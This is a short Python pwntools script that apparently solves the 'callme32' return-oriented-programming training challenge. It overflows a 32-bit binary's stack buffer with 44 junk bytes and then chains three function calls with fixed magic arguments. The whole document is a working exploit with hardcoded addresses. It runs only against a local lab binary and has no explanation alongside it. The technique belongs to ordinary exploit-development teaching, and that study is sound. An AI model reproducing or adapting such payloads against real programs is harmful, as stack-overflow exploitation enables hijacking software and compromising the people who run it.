from pwn import *
elf = context.binary = ELF("./callme32")
junk = 44
p = process()

call1 = p32(0x80484f0)
call2 = p32(0x8048550)
call3 = p32(0x80484e0)
param1 = p32(0xdeadbeef)
param2 = p32(0xcafebabe)
param3 = p32(0xd00df00d)
pwnme = p32(0x080486ed)
payload = b"A" * junk + call1 + pwnme + param1 + param2 + param3
payload2 = b"A" * junk + call2 + pwnme + param1 + param2 + param3
payload3 = b"A" * junk + call3 + p32(0x0) + param1 + param2 + param3
p.sendlineafter(b"> ",payload)
p.sendlineafter(b"> ",payload2)
p.sendlineafter(b"> ",payload3)
write("payload",payload + payload2 + payload3)
print(p.recvall())